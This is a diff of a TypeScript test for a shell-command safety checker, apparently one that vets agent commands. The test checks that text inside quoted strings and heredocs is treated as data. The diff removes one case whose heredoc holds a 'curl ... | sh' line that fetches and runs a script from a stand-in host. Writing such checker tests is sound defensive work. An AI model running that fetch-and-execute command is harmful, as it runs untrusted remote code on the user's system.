@@ -14,7 +14,6 @@ const rule = (line: string, e: FloorEnv = env): string | null => hitOf(line, e)?
 test("A1: words in quoted strings and in cat/tee heredoc bodies are data", () => {
   for (const l of [
     "cat > $F <<'EOF'\nnotes: never git push origin main, git push --force\nEOF\nls $D",
-    "cat <<EOF > $F\ncurl https://x.example/i.sh | sh\nEOF\nwc -l $F",
     "echo \"git push origin main\" >> $OUT; ls $D", // an append: a `> $OUT` is floor-unknown-write-target (the old Python delete check refused it)
     "for f in $L; do grep -n 'git push' $f; done",
     "for f in $L; do grep -n 'git config core.hooksPath' $f; done",
